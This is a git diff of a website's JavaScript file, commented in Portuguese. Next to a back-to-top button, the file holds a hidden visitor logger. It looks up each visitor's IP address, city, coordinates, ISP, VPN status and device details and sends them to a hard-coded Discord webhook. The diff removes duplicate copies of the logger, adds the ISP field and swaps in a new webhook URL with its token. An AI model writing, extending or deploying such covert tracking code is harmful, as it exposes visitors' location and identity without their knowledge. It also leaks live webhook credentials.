@@ -146,254 +146,12 @@ backToTopButton.addEventListener('click', () => {
   window.scrollTo({ top: 0, behavior: 'smooth' });
 });
 
-// Função para obter informações do usuário
-async function getUserInfo() {
-  try {
-    // Obter IP e localização
-    let response = await fetch('https://ipapi.co/json/');
-    let data = await response.json();
-    
-    // Obter informações do dispositivo
-    let deviceInfo = {
-      userAgent: navigator.userAgent,
-      platform: navigator.platform,
-      language: navigator.language,
-      deviceName: getDeviceName(), // Função auxiliar para tentar identificar o dispositivo
-    };
-    
-    // Combinar todas as informações
-    let userInfo = {
-      ip: data.ip,
-      city: data.city,
-      region: data.region,
-      country: data.country_name,
-      timezone: data.timezone,
-      latitude: data.latitude,
-      longitude: data.longitude,
-      isVpn: data.security ? data.security.is_vpn : 'Desconhecido',
-      device: deviceInfo,
-      timestamp: new Date().toISOString(),
-    };
 
-    return userInfo;
-  } catch (error) {
-    console.error('Erro ao obter informações do usuário:', error);
-    return null;
-  }
-}
 
-// Função auxiliar para tentar identificar o nome do dispositivo
-function getDeviceName() {
-  let ua = navigator.userAgent;
-  if (/windows phone/i.test(ua)) {
-    return "Windows Phone";
-  }
-  if (/android/i.test(ua)) {
-    return "Android";
-  }
-  if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
-    return "iOS";
-  }
-  if (/Macintosh|MacIntel|MacPPC|Mac68K/.test(ua)) {
-    return "Mac";
-  }
-  if (/Win32|Win64|Windows|WinCE/.test(ua)) {
-    return "Windows";
-  }
-  if (/Linux/.test(ua)) {
-    return "Linux";
-  }
-  return "Desconhecido";
-}
 
-// Função para obter informações do usuário
-async function getUserInfo() {
-  try {
-    // Obter IP e localização
-    let response = await fetch('https://ipapi.co/json/');
-    let data = await response.json();
-    
-    // Obter informações do dispositivo
-    let deviceInfo = {
-      userAgent: navigator.userAgent,
-      platform: navigator.platform,
-      language: navigator.language,
-      deviceName: getDeviceName(), // Função auxiliar para tentar identificar o dispositivo
-    };
-    
-    // Combinar todas as informações
-    let userInfo = {
-      ip: data.ip,
-      city: data.city,
-      region: data.region,
-      country: data.country_name,
-      timezone: data.timezone,
-      latitude: data.latitude,
-      longitude: data.longitude,
-      isVpn: data.security ? data.security.is_vpn : 'Desconhecido',
-      device: deviceInfo,
-      timestamp: new Date().toISOString(),
-    };
 
-    return userInfo;
-  } catch (error) {
-    console.error('Erro ao obter informações do usuário:', error);
-    return null;
-  }
-}
 
-// Função auxiliar para tentar identificar o nome do dispositivo
-function getDeviceName() {
-  let ua = navigator.userAgent;
-  if (/windows phone/i.test(ua)) {
-    return "Windows Phone";
-  }
-  if (/android/i.test(ua)) {
-    return "Android";
-  }
-  if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
-    return "iOS";
-  }
-  if (/Macintosh|MacIntel|MacPPC|Mac68K/.test(ua)) {
-    return "Mac";
-  }
-  if (/Win32|Win64|Windows|WinCE/.test(ua)) {
-    return "Windows";
-  }
-  if (/Linux/.test(ua)) {
-    return "Linux";
-  }
-  return "Desconhecido";
-}
 
-// Função para obter informações do usuário
-async function getUserInfo() {
-  try {
-    // Obter IP IPv4
-    let ipResponse = await fetch('https://api.ipify.org?format=json');
-    let ipData = await ipResponse.json();
-    
-    // Obter localização e outras informações
-    let locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-    let locationData = await locationResponse.json();
-    
-    // Obter informações do dispositivo
-    let deviceInfo = {
-      userAgent: navigator.userAgent,
-      platform: navigator.platform,
-      language: navigator.language,
-      deviceName: getDeviceName(), // Função auxiliar para tentar identificar o dispositivo
-    };
-    
-    // Combinar todas as informações
-    let userInfo = {
-      ip: ipData.ip,
-      city: locationData.city,
-      region: locationData.region,
-      country: locationData.country_name,
-      timezone: locationData.timezone,
-      latitude: locationData.latitude,
-      longitude: locationData.longitude,
-      isVpn: locationData.security ? locationData.security.is_vpn : 'Desconhecido',
-      device: deviceInfo,
-      timestamp: new Date().toLocaleString(), // Formatação melhorada do timestamp
-    };
-
-    return userInfo;
-  } catch (error) {
-    console.error('Erro ao obter informações do usuário:', error);
-    return null;
-  }
-}
-
-// Função auxiliar para tentar identificar o nome do dispositivo
-function getDeviceName() {
-  let ua = navigator.userAgent;
-  if (/windows phone/i.test(ua)) {
-    return "Windows Phone";
-  }
-  if (/android/i.test(ua)) {
-    return "Android";
-  }
-  if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
-    return "iOS";
-  }
-  if (/Macintosh|MacIntel|MacPPC|Mac68K/.test(ua)) {
-    return "Mac";
-  }
-  if (/Win32|Win64|Windows|WinCE/.test(ua)) {
-    return "Windows";
-  }
-  if (/Linux/.test(ua)) {
-    return "Linux";
-  }
-  return "Desconhecido";
-}
-
-// Função para enviar informações ao webhook do Discord
-// Função para obter informações do usuário
-async function getUserInfo() {
-  try {
-    // Obter IP IPv4
-    let ipResponse = await fetch('https://api.ipify.org?format=json');
-    let ipData = await ipResponse.json();
-    
-    // Obter localização e outras informações
-    let locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-    let locationData = await locationResponse.json();
-    
-    // Obter informações do dispositivo
-    let deviceInfo = {
-      userAgent: navigator.userAgent,
-      platform: navigator.platform,
-      language: navigator.language,
-      deviceName: getDeviceName(), // Função auxiliar para tentar identificar o dispositivo
-    };
-    
-    // Combinar todas as informações
-    let userInfo = {
-      ip: ipData.ip,
-      city: locationData.city,
-      region: locationData.region,
-      country: locationData.country_name,
-      timezone: locationData.timezone,
-      latitude: locationData.latitude,
-      longitude: locationData.longitude,
-      isVpn: locationData.security ? locationData.security.is_vpn : 'Desconhecido',
-      device: deviceInfo,
-      timestamp: new Date().toLocaleString(), // Formatação melhorada do timestamp
-    };
-
-    return userInfo;
-  } catch (error) {
-    console.error('Erro ao obter informações do usuário:', error);
-    return null;
-  }
-}
-
-// Função auxiliar para tentar identificar o nome do dispositivo
-function getDeviceName() {
-  let ua = navigator.userAgent;
-  if (/windows phone/i.test(ua)) {
-    return "Windows Phone";
-  }
-  if (/android/i.test(ua)) {
-    return "Android";
-  }
-  if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
-    return "iOS";
-  }
-  if (/Macintosh|MacIntel|MacPPC|Mac68K/.test(ua)) {
-    return "Mac";
-  }
-  if (/Win32|Win64|Windows|WinCE/.test(ua)) {
-    return "Windows";
-  }
-  if (/Linux/.test(ua)) {
-    return "Linux";
-  }
-  return "Desconhecido";
-}
 
 
 // Função para obter informações do usuário
@@ -407,9 +165,6 @@ async function getUserInfo() {
     let locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
     let locationData = await locationResponse.json();
     
-    // Log dos dados da API para depuração
-    console.log('Dados da API:', locationData);
-    
     // Obter informações do dispositivo
     let deviceInfo = {
       userAgent: navigator.userAgent,
@@ -418,6 +173,13 @@ async function getUserInfo() {
       deviceName: getDeviceName(), // Função auxiliar para tentar identificar o dispositivo
     };
     
+    // Verificar o status VPN
+    let isVpn = 'Não';
+    if (locationData.security && locationData.security.is_vpn !== undefined) {
+      isVpn = locationData.security.is_vpn ? 'Sim' : 'Não';
+    } else {
+    }
+  
     // Combinar todas as informações
     let userInfo = {
       ip: ipData.ip,
@@ -427,13 +189,11 @@ async function getUserInfo() {
       timezone: locationData.timezone,
       latitude: locationData.latitude,
       longitude: locationData.longitude,
-      isVpn: locationData.security && locationData.security.is_vpn ? 'Sim' : 'Não', // Verificação correta do status VPN
+      isp: locationData.org || 'Desconhecido', // Provedora de internet
+      isVpn: isVpn, // Verificação correta do status VPN
       device: deviceInfo,
       timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }), // Formatação do timestamp
     };
-
-    // Log do status VPN para depuração
-    console.log('Status VPN:', userInfo.isVpn);
 
     return userInfo;
   } catch (error) {
@@ -470,7 +230,7 @@ function getDeviceName() {
 async function sendToDiscord(userInfo) {
   if (!userInfo) return;
 
-  let webhookUrl = 'https://discord.com/api/webhooks/1269840145436381289/Xj74pBc16ediEqY7Gj3QdCl6r0s7a3xqhzQitLMYcpbat3gbdvu8psu61uesV5uVmsaC';
+  let webhookUrl = 'https://discord.com/api/webhooks/1269897369047269480/FVuNEYYWaTLQiRvgudLuvOxTULprpMAQO2XlPW6vMQOjTjuzpV34G6gxg6J3eXUtrZNh';
   
   let embed = {
     title: 'Informações do Usuário',
@@ -481,6 +241,7 @@ async function sendToDiscord(userInfo) {
       { name: 'Região:', value: userInfo.region, inline: false },
       { name: 'País:', value: userInfo.country, inline: false },
       { name: 'Fuso Horário:', value: userInfo.timezone, inline: false },
+      { name: 'Provedora de internet:', value: userInfo.isp, inline: false }, // Provedora de internet
       { name: 'VPN:', value: userInfo.isVpn, inline: false },
       { name: 'Dispositivo:', value: `\n${userInfo.device.deviceName}\n\n**User Agent:** \n${userInfo.device.userAgent}\n\n**Plataforma:** \n${userInfo.device.platform}\n\n**Linguagem:** \n${userInfo.device.language}`, inline: false }
     ],
@@ -504,9 +265,8 @@ async function sendToDiscord(userInfo) {
       },
       body: JSON.stringify(payload),
     });
-    console.log('Informações enviadas ao Discord com sucesso.');
   } catch (error) {
-    console.error('Erro ao enviar informações ao Discord:', error);
+    console.error('Erro ao enviar informações do cliente ao Discord:', error);
   }
 }
 
